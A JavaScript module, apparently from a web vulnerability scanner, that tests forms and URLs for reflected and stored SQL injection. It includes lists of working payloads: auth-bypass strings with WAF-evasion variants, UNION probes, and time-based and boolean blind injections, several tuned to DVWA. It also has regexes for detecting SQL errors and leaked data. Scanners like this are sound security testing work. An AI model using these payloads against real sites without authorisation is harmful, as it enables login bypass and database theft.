const axios = require('axios');
const { URL } = require('url');
const crypto = require('crypto');
const { sendRequest, fetchPage: sharedFetchPage } = require('./httpClient');
const { injectPayload: sharedInjectPayload, sleep, pushResult: sharedPushResult } = require('./utils');

// 1. Attack Vectors (Payloads)

// A. Error-Based Payloads
const ERROR_PAYLOADS = ["'", '"', "';", "`", "')", "'))"];

// B. Auth Bypass Payloads
const BYPASS_PAYLOADS = [
    "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --",
    "' OR 1=1 #", "admin' --", "admin' #",
    // WAF evasion
    "' oR '1'='1",                    // Mixed case
    "' OR '1'='1'/*",                 // Comment bypass
    "'/*!50000OR*/ '1'='1'",           // MySQL version comment
    "' OR 1=1 -- -",                  // Double dash space
    // DVWA Medium: numeric injection (no quotes, bypasses mysql_real_escape_string)
    "1 OR 1=1",
    "1 OR 1=1#",
    "1 OR 1=1--",
    "1 OR 1=1 #",
];

// B2. UNION-Based Payloads (column count detection)
const UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    // Numeric UNION (DVWA medium — no quotes needed)
    "1 UNION SELECT NULL,NULL#",
    "1 UNION SELECT user(),database()#",
    "1 UNION SELECT NULL,NULL,NULL#",
    "1 UNION SELECT user(),database(),NULL#",
];

// C. Time-Based Blind Payloads
const TIME_PAYLOADS = [
    "1' AND SLEEP(5) -- ",          // MySQL
    "1' AND (SELECT SLEEP(5)) -- ", // MySQL Alternative
    "1' WAITFOR DELAY '0:0:5' --",  // MSSQL
    "1' AND pg_sleep(5) --",        // PostgreSQL
    // DVWA Medium: numeric time-based (no quotes)
    "1 AND SLEEP(5)#",
    "1 AND SLEEP(5)-- ",
];

// D. Boolean-Based Blind Payloads (True/False Pairs)
const BOOLEAN_PAIRS = [
    { true: "' AND 1=1 --", false: "' AND 1=0 --" },
    { true: '" AND 1=1 --', false: '" AND 1=0 --' },
    { true: "') AND 1=1 --", false: "') AND 1=0 --" },
    // DVWA Medium: numeric boolean (no quotes)
    { true: "1 AND 1=1", false: "1 AND 1=0" },
    { true: "1 AND 1=1#", false: "1 AND 1=0#" },
];

// E. Stored/Second-Order SQLi Payloads (reduced set for speed)
const STORED_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; SELECT pg_sleep(5);--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--"
];


// 2. Detection Patterns
const SQL_ERRORS = [
    /SQL syntax.*MySQL/i, /Warning.*mysql_.*s/i, /PostgreSQL.*ERROR/i,
    /Driver.* SQL[\-\_\ ]*Server/i, /Oracle error/i, /syntax error/i,
    /You have an error in your SQL syntax/i, /Unclosed quotation mark/i,
    /Microsoft OLE DB Provider/i, /ODBC SQL Server Driver/i,
    /ORA-\d{5}/i, /PG::SyntaxError/i, /pg_query\(\)/i,
    /mysql_fetch_array\(\)/i, /mysql_num_rows\(\)/i,
    /Warning.*pg_/i, /valid MySQL result/i,
    /MySqlClient\./i, /com\.mysql\.jdbc/i,
    /SQLite3::query/i, /sqlite_array_query/i,
    /SQLITE_ERROR/i, /SQLite\/JDBCDriver/i,
    /supplied argument is not a valid MySQL/i,
    /on MySQL result index/i, /server error in .* application/i,
    /Syntax error or access violation/i
];

const SUCCESS_INDICATORS = [/Welcome, \w+/i, /Logout/i, /Dashboard/i, /My Account/i];


// 3. Main Scanning Function (Reflected/Immediate SQLi)
async function scanForSQLi(url, method = 'GET', data = {}, locationDescription, contentType = 'form', httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    // --- PHASE 0: Establish Baseline ---
    const baselineBody = await requestHelper(url, method, data, contentType, client);
    if (!baselineBody) return { vulnerabilities, scoreDeduction };

    // --- PHASE 1: Boolean-Based Blind Injection ---
    for (const pair of BOOLEAN_PAIRS) {
        const trueData = injectPayload(data, pair.true);
        const falseData = injectPayload(data, pair.false);

        const trueBody = await requestHelper(url, method, trueData, contentType, client);
        const falseBody = await requestHelper(url, method, falseData, contentType, client);

        if (trueBody === baselineBody && falseBody !== baselineBody) {
            vulnerabilities.push({
                type: 'SQL Injection',
                name: `Blind SQLi (Boolean-Based) [${contentType.toUpperCase()}]`,
                severity: 'High',
                location: locationDescription,
                description: `Content changed on False logic. True: ${pair.true}, False: ${pair.false}`
            });
            scoreDeduction += 20;
            return { vulnerabilities, scoreDeduction };
        }
    }

    // --- PHASE 2: Error, Bypass, and Time-Based ---
    const ALL_PAYLOADS = [...ERROR_PAYLOADS, ...BYPASS_PAYLOADS, ...TIME_PAYLOADS];

    for (const payload of ALL_PAYLOADS) {
        const attackData = injectPayload(data, payload);
        const isTimePayload = TIME_PAYLOADS.includes(payload);
        const startTime = Date.now();

        try {
            const res = await axiosHelper(url, method, attackData, contentType, isTimePayload, client);
            const duration = Date.now() - startTime;
            const body = res.body;

            if (isTimePayload && duration > 4500) {
                vulnerabilities.push({
                    type: 'SQL Injection',
                    name: `Blind SQLi (Time-Based) [${contentType.toUpperCase()}]`,
                    severity: 'Critical',
                    location: locationDescription,
                    description: `Delayed response (${duration}ms) via: ${payload}`
                });
                scoreDeduction += 25;
                return { vulnerabilities, scoreDeduction };
            }

            for (const regex of SQL_ERRORS) {
                if (regex.test(body)) {
                    vulnerabilities.push({
                        type: 'SQL Injection',
                        name: `Error Based SQLi [${contentType.toUpperCase()}]`,
                        severity: 'Critical',
                        location: locationDescription,
                        description: `SQL error triggered by payload: ${payload}`
                    });
                    scoreDeduction += 20;
                    return { vulnerabilities, scoreDeduction };
                }
            }

            if (BYPASS_PAYLOADS.includes(payload)) {
                if (res.status === 302 || SUCCESS_INDICATORS.some(reg => reg.test(body))) {
                    vulnerabilities.push({
                        type: 'SQL Injection',
                        name: 'Auth Bypass Detected',
                        severity: 'High',
                        location: locationDescription,
                        description: `Potential login bypass with: ${payload}`
                    });
                    scoreDeduction += 20;
                    return { vulnerabilities, scoreDeduction };
                }
            }

            if (res.status >= 500 && !baselineBody.includes('500')) {
                vulnerabilities.push({
                    type: 'SQL Injection',
                    name: `Server Error SQLi [${contentType.toUpperCase()}]`,
                    severity: 'High',
                    location: locationDescription,
                    description: `Server returned HTTP ${res.status} on payload: ${payload}`
                });
                scoreDeduction += 15;
                return { vulnerabilities, scoreDeduction };
            }

        } catch (err) {
            if (isTimePayload && err.code === 'ECONNABORTED') {
                vulnerabilities.push({
                    type: 'SQL Injection',
                    name: 'Blind SQLi (Time-Based Timeout)',
                    severity: 'Critical',
                    location: locationDescription,
                    description: `Server hung for >10s on payload: ${payload}`
                });
                scoreDeduction += 25;
                return { vulnerabilities, scoreDeduction };
            }
        }
    }

    // --- PHASE 3: UNION-Based Detection ---
    for (const payload of UNION_PAYLOADS) {
        const attackData = injectPayload(data, payload);
        try {
            const res = await axiosHelper(url, method, attackData, contentType, false, client);
            const body = res.body;

            if (body !== baselineBody && body.length !== baselineBody.length) {
                const hasError = SQL_ERRORS.some(r => r.test(body));
                if (!hasError && Math.abs(body.length - baselineBody.length) > 50) {
                    vulnerabilities.push({
                        type: 'SQL Injection',
                        name: `UNION-Based SQLi [${contentType.toUpperCase()}]`,
                        severity: 'Critical',
                        location: locationDescription,
                        description: `UNION payload changed response significantly. Payload: ${payload}`
                    });
                    scoreDeduction += 25;
                    return { vulnerabilities, scoreDeduction };
                }
            }
        } catch (err) { /* continue */ }
    }

    return { vulnerabilities, scoreDeduction };
}


// 4. Stored/Second-Order SQLi Scanning (NEW)
// Submits SQL payloads via forms, then checks display pages for SQL errors/anomalies.
async function scanForStoredSQLi(form, verifyUrls, report, httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    // Capture baselines for all verify URLs in PARALLEL
    const baselineResults = await Promise.all(
        verifyUrls.map(async vUrl => {
            try { return { url: vUrl, body: await fetchPage(vUrl, client) }; }
            catch (e) { return { url: vUrl, body: '' }; }
        })
    );
    const baselines = {};
    baselineResults.forEach(r => baselines[r.url] = r.body);

    // Build input data from form
    const inputs = {};
    for (const [name] of Object.entries(form.inputs)) {
        inputs[name] = 'placeholder';
    }

    if (Object.keys(inputs).length === 0) {
        return { vulnerabilities, scoreDeduction };
    }

    // Test each parameter individually to identify the exact affected field
    for (const paramName of Object.keys(inputs)) {
        for (const payload of STORED_SQLI_PAYLOADS) {
            // Build attack data: inject payload into ONE field, use safe values for others
            const attackData = {};
            for (const key of Object.keys(inputs)) {
                attackData[key] = (key === paramName) ? payload : 'safe_test_value';
            }

            try {
                // Step 1: Submit the payload
                await axiosHelper(form.action, form.method, attackData, 'form', false, client);

                // Step 2: Brief wait for server-side processing
                await sleep(100);

                // Step 3: Check all verify URLs in PARALLEL for SQL errors
                const verifyResults = await Promise.all(
                    verifyUrls.map(async vUrl => {
                        try { return { url: vUrl, body: await fetchPage(vUrl, client) }; }
                        catch (e) { return { url: vUrl, body: '' }; }
                    })
                );

                for (const { url: vUrl, body: pageBody } of verifyResults) {
                    const baseline = baselines[vUrl] || '';

                    // A. Check for SQL error strings in the displayed page
                    for (const regex of SQL_ERRORS) {
                        if (regex.test(pageBody) && !regex.test(baseline)) {
                            vulnerabilities.push({
                                type: 'SQL Injection',
                                name: 'Stored/Second-Order SQLi Detected',
                                severity: 'Critical',
                                location: `Parameter: "${paramName}" in form at ${form.action} → error on ${vUrl}`,
                                description: `SQL error appeared on ${vUrl} after injecting parameter "${paramName}" at ${form.action}. Payload: ${payload}`
                            });
                            scoreDeduction += 30;

                            if (report) {
                                pushResult(report, { vulnerabilities, scoreDeduction }, 'Stored SQLi', true);
                            }
                            return { vulnerabilities, scoreDeduction };
                        }
                    }

                    // B. Check for significant content anomaly (page changed dramatically)
                    if (baseline && pageBody) {
                        const sizeDiff = Math.abs(pageBody.length - baseline.length);
                        const sizeRatio = sizeDiff / (baseline.length || 1);

                        // If content changed by more than 50% AND contains suspicious patterns
                        if (sizeRatio > 0.5) {
                            const suspiciousPatterns = [
                                /table_name/i, /column_name/i, /information_schema/i,
                                /UNION.*SELECT/i, /@@version/i, /database\(\)/i,
                                /root@/i, /admin.*password/i
                            ];
                            for (const pat of suspiciousPatterns) {
                                if (pat.test(pageBody) && !pat.test(baseline)) {
                                    vulnerabilities.push({
                                        type: 'SQL Injection',
                                        name: 'Stored SQLi (Data Leak)',
                                        severity: 'Critical',
                                        location: `Parameter: "${paramName}" in form at ${form.action} → leaked on ${vUrl}`,
                                        description: `Suspicious data appeared on ${vUrl} after injecting parameter "${paramName}" at ${form.action}. Payload: ${payload}`
                                    });
                                    scoreDeduction += 30;

                                    if (report) {
                                        pushResult(report, { vulnerabilities, scoreDeduction }, 'Stored SQLi (Data Leak)', true);
                                    }
                                    return { vulnerabilities, scoreDeduction };
                                }
                            }
                        }
                    }
                }
            } catch (err) {
                // Submission failed, try next payload
            }
        }
    }

    return { vulnerabilities, scoreDeduction };
}


// 5. Utility Helpers — Delegated to shared modules

const injectPayload = sharedInjectPayload;
const pushResult = sharedPushResult;

async function requestHelper(url, method, data, contentType, httpClient) {
    try {
        const res = await axiosHelper(url, method, data, contentType, false, httpClient);
        return res.body;
    } catch (e) { return ""; }
}

async function axiosHelper(url, method, data, contentType, isTime, client) {
    const http = client || axios;
    return sendRequest(http, { url, method, data, contentType, timeout: isTime ? 10000 : 8000 });
}

async function fetchPage(url, client) {
    const http = client || axios;
    return sharedFetchPage(http, url);
}


module.exports = { scanForSQLi, scanForStoredSQLi };